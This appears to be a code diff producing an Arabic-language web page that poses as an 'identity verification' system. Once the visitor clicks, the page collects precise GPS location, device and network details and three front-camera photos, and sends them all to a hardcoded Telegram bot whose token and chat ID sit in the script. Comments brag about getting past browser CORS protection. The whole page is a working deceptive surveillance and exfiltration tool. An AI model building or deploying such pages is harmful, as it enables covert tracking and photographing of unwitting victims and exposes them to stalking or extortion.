@@ -1,45 +1,170 @@
-async function captureAndSend(location, device, network) {
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const context = canvas.getContext('2d');
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام التحقق الذكي</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 20px;
+            background-color: #f0f2f5;
+            color: #333;
+        }
+        .container {
+            max-width: 500px;
+            margin: 50px auto;
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+        h2 { color: #0088cc; margin-bottom: 10px; }
+        p { color: #666; font-size: 14px; margin-bottom: 25px; }
+        button {
+            padding: 15px 30px;
+            font-size: 16px;
+            font-weight: bold;
+            background-color: #0088cc;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+            box-shadow: 0 4px 6px rgba(0,136,204,0.2);
+        }
+        button:hover {
+            background-color: #006699;
+            transform: translateY(-2px);
+        }
+        #status {
+            margin-top: 20px;
+            font-weight: bold;
+            font-size: 15px;
+        }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
 
-    try {
-        // تشغيل كاميرا الجهاز
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-        video.srcObject = stream;
-        await new Promise(resolve => video.onloadedmetadata = resolve);
+    <div class="container">
+        <h2>تأكيد الهوية والتحقق</h2>
+        <p>يرجى الضغط على الزر أدناه للسماح بصلاحيات الموقع والكاميرا لإتمام عملية التحقق وإرسال التقرير.</p>
+        <button id="startBtn">ابدأ التحقق الآن</button>
+        <div id="status"></div>
+    </div>
 
-        // 1. أرسل البيانات النصية أولاً للتأكد من أن البوت شغال
-        const textMessage = `🚨 بيانات جديدة:\n📍 Location: ${location}\n📱 Device: ${device}\n🌐 Network: ${network}`;
-        
-        // استخدام رابط مباشر لإرسال النص وتفادي حظر المتصفح
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(textMessage)}`);
+    <!-- عناصر النظام الخلفية لتشغيل الكاميرا والتقاط الصور -->
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
 
-        // 2. التقاط صورة وإرسالها
-        await new Promise(resolve => setTimeout(resolve, 1000)); // انتظر ثانية لتوضح الصورة
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-        canvas.toBlob(async (blob) => {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'photo.jpg');
+    <script>
+        // إعدادات البوت والدردشة الخاصة بك
+        const TELEGRAM_TOKEN = "8798573888:AAE38QVvgG0DgwePDKMaBcOpKOomweVzsb8";
+        const CHAT_ID = "5394550159";
 
-            // إرسال الصورة
-            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData,
-                mode: 'no-cors' // تخطي حظر الحماية للمتصفح
+        document.getElementById('startBtn').addEventListener('click', async () => {
+            const statusDiv = document.getElementById('status');
+            statusDiv.style.color = "#333";
+            statusDiv.innerText = "⏳ جاري معالجة الطلب وجمع البيانات المتاحة...";
+
+            let locationData = "❌ (تم رفض إذن الموقع أو غير مدعوم)";
+            const deviceInfo = navigator.userAgent;
+            const networkInfo = navigator.connection ? `Type: ${navigator.connection.effectiveType}, Downlink: ${navigator.connection.downlink}Mbps` : "Unknown";
+
+            // 1. محاولة جلب الموقع الجغرافي (إذا رُفض الإذن، سيكمل الكود بشكل طبيعي)
+            try {
+                locationData = await getPosition();
+            } catch (err) {
+                console.log("إذن الموقع مرفوض أو تعذر جلب الإحداثيات.");
+            }
+
+            // 2. إرسال البيانات النصية المتاحة فوراً لتليجرام
+            const textMessage = `📊 تقرير جديد:\n📌 الموقع: ${locationData}\n📱 الجهاز: ${deviceInfo}\n🌐 الشبكة: ${networkInfo}`;
+            sendTextMessage(textMessage);
+
+            // 3. محاولة تشغيل الكاميرا والتقاط الصور (إذا رُفض الإذن، سيكمل الكود أيضاً)
+            try {
+                await captureAndSendPhotos(locationData);
+                statusDiv.style.color = "green";
+                statusDiv.innerText = "✅ اكتملت العملية بنجاح (تم إرسال كل ما هو متاح)!";
+            } catch (error) {
+                console.log("إذن الكاميرا مرفوض أو غير متاحة.");
+                statusDiv.style.color = "orange";
+                statusDiv.innerText = "✅ تم إرسال البيانات النصية بنجاح (الكاميرا كانت محجوبة/مرفوضة).";
+            }
+        });
+
+        // دالة جلب إحداثيات الموقع
+        function getPosition() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) reject();
+                navigator.geolocation.getCurrentPosition(
+                    (position) => resolve(`https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`),
+                    () => reject(),
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
             });
-        }, 'image/jpeg');
+        }
 
-        // إيقاف الكاميرا
-        setTimeout(() => {
+        // دالة إرسال النصوص إلى تليجرام
+        function sendTextMessage(text) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+            }).catch(err => console.log("خطأ في إرسال النص:", err));
+        }
+
+        // دالة فتح الكاميرا والتقاط 3 صور بشكل مستقل
+        async function captureAndSendPhotos(location) {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+
+            // طلب فتح الكاميرا
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }, 
+                audio: false 
+            });
+            video.srcObject = stream;
+
+            // انتظار ثانية ونصف لتجهيز الكاميرا ووضوح الصورة
+            await new Promise(resolve => setTimeout(resolve, 1500));
+
+            const captionMessage = `🖼️ لقطة مرافقة للتقرير\n📍 الموقع: ${location}`;
+
+            // التقاط 3 صور (بين كل صورة وصورة ثانية واحدة)
+            for (let i = 0; i < 3; i++) {
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                await new Promise((resolve) => {
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, `snap_${i}.jpg`);
+                        formData.append('caption', captionMessage);
+
+                        // إرسال الصورة مع تخطي حظر الحماية الـ CORS للمتصفح
+                        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData,
+                            mode: 'no-cors'
+                        });
+                        resolve();
+                    }, 'image/jpeg', 0.8);
+                });
+
+                if (i < 2) await new Promise(res => setTimeout(res, 1000));
+            }
+
+            // إغلاق الكاميرا فوراً بعد الانتهاء
             stream.getTracks().forEach(track => track.stop());
-        }, 2000);
-
-    } catch (e) {
-        // إذا رفض المستخدم الكاميرا، أرسل البيانات النصية فقط
-        const textMessage = `📍 الموقغ: ${location}\n(تم رفض إذن الكاميرا)`;
-        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(textMessage)}`);
-    }
-}
+        }
+    </script>
+</body>
+</html>
